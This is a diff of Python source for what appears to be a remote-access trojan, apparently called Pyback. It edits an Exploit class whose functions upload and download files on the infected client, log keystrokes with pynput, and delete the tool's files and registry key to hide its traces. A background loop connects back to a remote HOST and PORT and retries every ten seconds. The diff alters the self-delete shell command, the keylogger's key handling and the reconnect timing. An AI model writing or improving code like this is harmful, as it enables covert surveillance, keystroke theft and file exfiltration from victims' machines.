@@ -4,9 +4,9 @@ import shutil
 import socket
 import struct
 import subprocess
-import sys
 import time
 from threading import Thread
+import sys
 
 from pynput.keyboard import Listener
 
@@ -47,9 +47,9 @@ class Exploit(Client):
 
     @staticmethod
     def remove():  # remove all the files from client and delete the reg key
-        path = f'{os.environ["APPDATA"]}\\Pyback'
-        command = f"timeout /T 5 & del /Q /S {path} & rmdir {path}"
-        subprocess.Popen(command)
+        path = f"""{os.environ["APPDATA"]}\\Pyback"""
+        command = f"""timeout 5 && del /Q /S {path} && rmdir {path}"""
+        subprocess.run(command, shell=True)
         sys.exit(0)
 
     def upload(self):  # upload command: upload a file to the client
@@ -59,7 +59,6 @@ class Exploit(Client):
             file.write(file_content)
 
     def download(self):  # download command: download a file from the client
-        print("download")
         local_path = self.recv().decode()
         with open(local_path, 'rb') as file:
             while True:
@@ -98,10 +97,11 @@ class Exploit(Client):
         self.key_log = True
 
         def on_press(key):
-            try:
+            key = str(key)
+            if key[0] == "'":
                 key = str(key).replace("'", "")
-            except AttributeError:
-                key = str(key).replace("'", "")
+            else:
+                print(key)
                 if key == "Key.space":
                     key = ' '
                 elif key == "Key.enter":
@@ -134,15 +134,16 @@ class Exploit(Client):
         os.remove('keylogs.txt')
 
 
-def background():  # connect to the server and retry all 10 seconds
+def background():  # try to connect to the server and retry all 10 seconds
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    time.sleep(20)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    time.sleep(10)
     while True:
         try:
             sock.connect((HOST, PORT))
             break
         except ConnectionRefusedError or ConnectionAbortedError:
-            time.sleep(10)
+            time.sleep(10)  # rest time between tries
     interpreter(sock)
 
 
